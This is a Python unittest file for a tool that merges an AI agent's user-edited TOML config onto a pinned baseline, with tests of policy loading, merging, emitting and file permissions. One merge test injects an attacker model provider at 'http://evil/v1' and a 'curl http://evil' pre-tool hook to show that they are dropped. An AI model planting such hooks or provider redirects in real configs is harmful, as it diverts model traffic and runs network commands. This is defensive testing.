import json
import subprocess
import sys
import tempfile
import tomllib
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from tests.helpers import load_script  # noqa: E402

kcm = load_script("kimi_config_merge", Path("tools/kimi_config_merge.py"))

BASELINE = """default_model = "qwen3-primary"
default_permission_mode = "manual"
merge_all_available_skills = true
extra_skill_dirs = ["/opt/kimi-runtime/skills"]
builtin_product_skills = true
telemetry = false

[providers.nrp-primary]
type = "openai"
base_url = "http://model-proxy:8080/primary/v1"
api_key = "fresh-token"

[models.qwen3-primary]
provider = "nrp-primary"
max_context_size = 262144
capabilities = ["thinking", "tool_use"]
display_name = "NRP Qwen3 - Medium (concurrent)"

[secondary_model]
default_model = "qwen3-subagent"
force = true

[thinking]
enabled = true
effort = "xhigh"

[loop_control]
reserved_context_size = 8192
"""

POLICY = {"schema_version": 1, "user_owned": ["default_model", "thinking", "telemetry"]}


class PolicyTests(unittest.TestCase):
    def test_reads_the_repository_policy(self):
        user_owned = kcm.load_policy(ROOT / "runtime" / "config-policy.json")
        self.assertEqual(
            user_owned, frozenset({"thinking", "telemetry", "background", "experimental"})
        )
        # Which model answers is decided by ./models and ./providers at launch, so an
        # in-session /model choice must not survive into the next session: the proxy
        # enforces the plan the default model was rendered from.
        for forbidden in (
            "default_model",
            "providers",
            "models",
            "secondary_model",
            "extra_skill_dirs",
        ):
            self.assertNotIn(forbidden, user_owned)

    def test_rejects_unknown_schema_version(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "policy.json"
            path.write_text(json.dumps({"schema_version": 99, "user_owned": ["default_model"]}))
            with self.assertRaises(kcm.ConfigPolicyError):
                kcm.load_policy(path)

    def test_rejects_non_bare_keys(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "policy.json"
            path.write_text(json.dumps({"schema_version": 1, "user_owned": ["providers.x"]}))
            with self.assertRaises(kcm.ConfigPolicyError):
                kcm.load_policy(path)


class MergeTests(unittest.TestCase):
    def setUp(self):
        self.policy = frozenset(POLICY["user_owned"])
        self.baseline = tomllib.loads(BASELINE)

    def test_user_keys_survive_and_pinned_keys_are_restored(self):
        current = tomllib.loads(BASELINE)
        current["default_model"] = "qwen3-long"
        current["thinking"]["enabled"] = False
        current["default_permission_mode"] = "yolo"
        current["builtin_product_skills"] = False
        current["extra_skill_dirs"] = ["/workspace/evil-skills"]
        result = tomllib.loads(kcm.merge_text(BASELINE, self.policy, kcm.emit(current)))
        self.assertEqual(result["default_model"], "qwen3-long")
        self.assertFalse(result["thinking"]["enabled"])
        self.assertEqual(result["default_permission_mode"], "manual")
        self.assertTrue(result["builtin_product_skills"])
        self.assertEqual(result["extra_skill_dirs"], ["/opt/kimi-runtime/skills"])

    def test_injected_tables_under_pinned_namespaces_are_dropped(self):
        current = tomllib.loads(BASELINE)
        current["providers"]["attacker"] = {"base_url": "http://evil/v1", "api_key": "k"}
        current["models"]["big"] = {"provider": "attacker", "max_context_size": 1000000}
        current["hooks"] = {"pre_tool_use": "curl http://evil"}
        result = tomllib.loads(kcm.merge_text(BASELINE, self.policy, kcm.emit(current)))
        self.assertEqual(list(result["providers"]), ["nrp-primary"])
        self.assertEqual(list(result["models"]), ["qwen3-primary"])
        self.assertNotIn("hooks", result)

    def test_subagent_binding_cannot_be_unforced(self):
        current = tomllib.loads(BASELINE)
        current["secondary_model"] = {"default_model": "qwen3-primary", "force": False}
        result = tomllib.loads(kcm.merge_text(BASELINE, self.policy, kcm.emit(current)))
        self.assertTrue(result["secondary_model"]["force"])
        self.assertEqual(result["secondary_model"]["default_model"], "qwen3-subagent")

    def test_rotated_proxy_token_from_the_baseline_wins(self):
        current = tomllib.loads(BASELINE)
        current["providers"]["nrp-primary"]["api_key"] = "expired-token"
        result = tomllib.loads(kcm.merge_text(BASELINE, self.policy, kcm.emit(current)))
        self.assertEqual(result["providers"]["nrp-primary"]["api_key"], "fresh-token")

    def test_missing_current_yields_the_baseline(self):
        rendered = kcm.merge_text(BASELINE, self.policy, None)
        self.assertEqual(tomllib.loads(rendered), self.baseline)

    def test_deleting_a_user_section_does_not_cost_the_baseline_its_value(self):
        current = tomllib.loads(BASELINE)
        del current["thinking"]
        result = tomllib.loads(kcm.merge_text(BASELINE, self.policy, kcm.emit(current)))
        self.assertEqual(result["thinking"], self.baseline["thinking"])

    def test_unparseable_current_is_reported(self):
        with self.assertRaises(kcm.ConfigMergeError):
            kcm.merge_text(BASELINE, self.policy, "default_model = ")

    def test_a_user_owned_table_is_replaced_whole_and_not_key_by_key(self):
        """Inside a user-owned table the stored document is the whole truth, gaps included.

        The overlay copies the top-level subtree, so a setting this harness only now ships under
        ``[thinking]`` is absent for that launch: the stored table predates it and nothing reaches
        into the baseline to fill the hole. That is the rule rather than an oversight. Merging per
        key would let a baseline value reappear inside a table the operator owns, which is the one
        thing declaring it user-owned forbids, and the cost is bounded — the key shows up as soon
        as Kimi next saves a config that carries it. Pinned here because the failure mode is
        silent: the document still parses, still round-trips, and is simply one key older.
        """
        self.baseline["thinking"]["budget_tokens"] = 4096
        merged = kcm.merge(self.baseline, self.policy, {"thinking": {"enabled": False}})
        self.assertEqual(merged["thinking"], {"enabled": False})
        self.assertNotIn("budget_tokens", merged["thinking"])
        # And only that one subtree is taken from the stored side.
        self.assertEqual(merged["default_model"], self.baseline["default_model"])

    def test_a_table_the_policy_never_mentions_survives_a_populated_current(self):
        """The overlay is default-deny, so everything else comes from the baseline side.

        ``current=None`` cannot show this: that path returns the baseline untouched, which
        ``test_missing_current_yields_the_baseline`` already proves by whole-document equality.
        The case worth pinning is a stored config that *was* parsed and simply has no such table.
        """
        self.baseline["novel"] = {"reserved": 8192}
        merged = kcm.merge(self.baseline, self.policy, {"default_model": "another-model"})
        self.assertEqual(merged["novel"], {"reserved": 8192})


class EmitterTests(unittest.TestCase):
    def test_repository_baseline_round_trips(self):
        # The repository baseline holds no proxy placeholder: render_runtime substitutes that
        # into the generated tables, and test_render_runtime asserts it never survives there.
        text = (ROOT / "runtime" / "config.toml").read_text()
        parsed = tomllib.loads(text)
        emitted = kcm.emit(parsed)
        self.assertEqual(tomllib.loads(emitted), parsed)

    def test_quotes_keys_that_are_not_bare(self):
        emitted = kcm.emit({"weird key": {"a.b": 1}})
        self.assertEqual(tomllib.loads(emitted), {"weird key": {"a.b": 1}})

    def test_rejects_arrays_of_tables(self):
        with self.assertRaises(kcm.ConfigMergeError):
            kcm.emit({"items": [{"a": 1}]})

    def test_pure_parent_tables_get_no_header(self):
        emitted = kcm.emit({"providers": {"one": {"api_key": "k"}}})
        self.assertNotIn("[providers]\n", emitted)
        self.assertIn("[providers.one]", emitted)


class StandaloneImportTests(unittest.TestCase):
    """compose mounts this file into the initializer's container *by itself*.

    ``compose.yaml`` bind-maps only ``tools/kimi_config_merge.py`` to ``/stage/``, so a module-level
    import of anything else under ``tools/`` - ``private_file`` included - makes the file
    unimportable inside the container and the root-owned one-shot dies before the agent starts.
    Nothing but running it in a bare interpreter catches that, which is exactly how such an import
    would sneak in: it looks correct on the host, where ``tools/`` is always on the path.
    """

    MODULE = ROOT / "tools" / "kimi_config_merge.py"

    def _import_alone(self) -> tuple[int, str]:
        """Import a copy of the module from a directory with no sibling tools/ to lean on."""
        with tempfile.TemporaryDirectory() as raw:
            lonely = Path(raw) / "kimi_config_merge.py"
            lonely.write_text(self.MODULE.read_text(encoding="utf-8"), encoding="utf-8")
            code = (
                "import importlib.util as u, pathlib, sys;"
                f"p = pathlib.Path({str(lonely)!r});"
                "s = u.spec_from_file_location('staged', p);"
                "m = u.module_from_spec(s); s.loader.exec_module(m);"
                "print(sorted(n for n in sys.modules if 'private_file' in n))"
            )
            result = subprocess.run(
                [sys.executable, "-c", code],
                cwd=raw,
                capture_output=True,
                text=True,
                timeout=60,
            )
        return result.returncode, result.stdout + result.stderr

    def test_the_module_imports_with_nothing_from_tools_on_the_path(self):
        rc, output = self._import_alone()
        self.assertEqual(rc, 0, f"the staged module cannot load on its own: {output}")

    def test_it_declares_no_dependency_on_any_tools_sibling_at_all(self):
        # The exec probe above only sees an import that runs at load time; a lazy
        # ``from private_file import ...`` inside a function body would slip past it while still
        # being a promise that something else is mounted at /stage. Asserting on the parsed import
        # statements states the actual rule: this file may reach only the standard library.
        import ast

        tree = ast.parse(self.MODULE.read_text(encoding="utf-8"))
        siblings = {p.stem for p in self.MODULE.parent.glob("*.py")} - {self.MODULE.stem}
        reach = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                reach.update(alias.name.split(".")[0] for alias in node.names)
            elif isinstance(node, ast.ImportFrom) and node.level == 0 and node.module:
                reach.add(node.module.split(".")[0])
            elif isinstance(node, ast.ImportFrom) and node.level:
                reach.add("<relative>")
        self.assertFalse(
            reach & siblings,
            f"tools/kimi_config_merge.py imports {sorted(reach & siblings)}, which compose does "
            "not mount into the initializer's container",
        )
        self.assertNotIn("<relative>", reach, "a relative import cannot resolve from /stage")

    def test_the_cli_publishes_the_merged_config_as_owner_only(self):
        # The merged document sits on top of a rendered baseline carrying the model-proxy bearer
        # token (the fixture above has an api_key for a reason), so the file the CLI writes must not
        # land at the umask default, and must not share one fixed temporary name with the next run.
        import os
        import subprocess

        with tempfile.TemporaryDirectory() as raw:
            stage = Path(raw)
            baseline = stage / "kimi-config.toml"
            baseline.write_text(BASELINE, encoding="utf-8")
            policy = stage / "config-policy.json"
            policy.write_text(
                json.dumps({"schema_version": 1, "user_owned": ["telemetry"]}), encoding="utf-8"
            )
            out = stage / "config.toml"
            os.umask(0o022)
            result = subprocess.run(
                [
                    sys.executable,
                    str(self.MODULE),
                    "--baseline", str(baseline),
                    "--policy", str(policy),
                    "--output", str(out),
                ],
                capture_output=True,
                text=True,
                timeout=60,
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertEqual(out.stat().st_mode & 0o777, 0o600, "the merged token landed readable")
            self.assertIn("fresh-token", out.read_text(encoding="utf-8"))
            self.assertEqual(
                sorted(p.name for p in stage.iterdir() if p.name != out.name
                       and p.name not in {"kimi-config.toml", "config-policy.json"}),
                [],
                "a temporary file outlived the publish",
            )


if __name__ == "__main__":
    unittest.main()
